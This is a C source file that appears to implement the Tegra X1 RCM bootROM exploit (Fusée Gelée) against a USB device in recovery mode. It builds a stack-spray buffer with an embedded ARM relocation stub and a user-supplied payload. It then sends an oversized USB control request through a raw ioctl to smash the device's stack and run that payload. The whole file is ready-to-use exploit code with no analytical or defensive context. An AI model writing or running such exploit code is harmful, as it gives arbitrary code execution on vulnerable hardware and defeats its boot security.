#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <unistd.h>
#include <libusb-1.0/libusb.h>

struct usbdevfs_urb {
    unsigned char type;
    unsigned char endpoint;
    int status;
    unsigned int flags;
    void *buffer;
    int buffer_length;
    int actual_length;
    int start_frame;
    int number_of_packets;
    int error_count;
    unsigned int signr;
    void *usercontext;
};

#define USBDEVFS_SUBMITURB _IOR('U', 10, struct usbdevfs_urb)

unsigned char intermezzo[] = {
  0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0, 
  0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1, 
  0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB, 
  0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4, 
  0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40, 
  0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
};

int main(int count, char **arguments) {
    if (count < 2) {
        printf("need payload\n");
        return 1;
    }

    FILE *file = fopen(arguments[1], "rb");
    if (!file) {
        printf("fail\n");
        return 1;
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    rewind(file);

    long spray = 0x3C00;
    long start = 0x2A8;
    long base = start + (spray * 4);
    long length = base + 0x1000 + size;
    long padding = (0x1000 - (length % 0x1000)) % 0x1000;
    long total = length + padding;

    unsigned char *buffer = calloc(total, 1);
    
    long initial = 0x30298;
    buffer[0] = initial & 0xFF;
    buffer[1] = (initial >> 8) & 0xFF;
    buffer[2] = (initial >> 16) & 0xFF;
    buffer[3] = (initial >> 24) & 0xFF;

    long address = 0x4001F000;
    for (long i = 0; i < spray; i++) {
        long offset = start + (i * 4);
        buffer[offset] = address & 0xFF;
        buffer[offset + 1] = (address >> 8) & 0xFF;
        buffer[offset + 2] = (address >> 16) & 0xFF;
        buffer[offset + 3] = (address >> 24) & 0xFF;
    }

    memcpy(buffer + base, intermezzo, sizeof(intermezzo));
    fread(buffer + base + 0x1000, 1, size, file);
    fclose(file);

    libusb_context *context = NULL;
    libusb_init(&context);

    libusb_device_handle *handle = libusb_open_device_with_vid_pid(context, 0x0955, 0x7321);
    if (!handle) {
        printf("missing\n");
        free(buffer);
        libusb_exit(context);
        return 1;
    }

    printf("found\n");

    unsigned char incoming[16];
    libusb_bulk_transfer(handle, 0x81, incoming, 16, NULL, 1000);

    int sent = 0;
    long chunks = total / 0x1000;
    for (long i = 0; i < chunks; i++) {
        libusb_bulk_transfer(handle, 0x01, buffer + (i * 0x1000), 0x1000, &sent, 1000);
    }

    if (chunks % 2 == 0) {
        unsigned char dummy[0x1000] = {0};
        libusb_bulk_transfer(handle, 0x01, dummy, 0x1000, &sent, 1000);
    }

    printf("sent\n");

    int bus = libusb_get_bus_number(libusb_get_device(handle));
    int device = libusb_get_device_address(libusb_get_device(handle));
    char path[128];
    sprintf(path, "/dev/bus/usb/%03d/%03d", bus, device);
    
    int fd = open(path, O_RDWR);
    if (fd < 0) {
        printf("fd fail\n");
    } else {
        struct usbdevfs_urb urb;
        memset(&urb, 0, sizeof(urb));
        urb.type = 2; 
        urb.endpoint = 0; 
        
        unsigned char *setup = calloc(8 + 0x7000, 1);
        setup[0] = 0x82;
        setup[1] = 0;
        setup[2] = 0; setup[3] = 0;
        setup[4] = 0; setup[5] = 0;
        setup[6] = 0x00; setup[7] = 0x70; 
        
        urb.buffer = setup;
        urb.buffer_length = 8 + 0x7000;
        
        int r = ioctl(fd, USBDEVFS_SUBMITURB, &urb);
        if (r < 0) {
            printf("smash error: %d\n", errno);
        } else {
            printf("smashed\n");
        }
        close(fd);
        free(setup);
    }

    libusb_close(handle);
    libusb_exit(context);
    free(buffer);

    return 0;
}
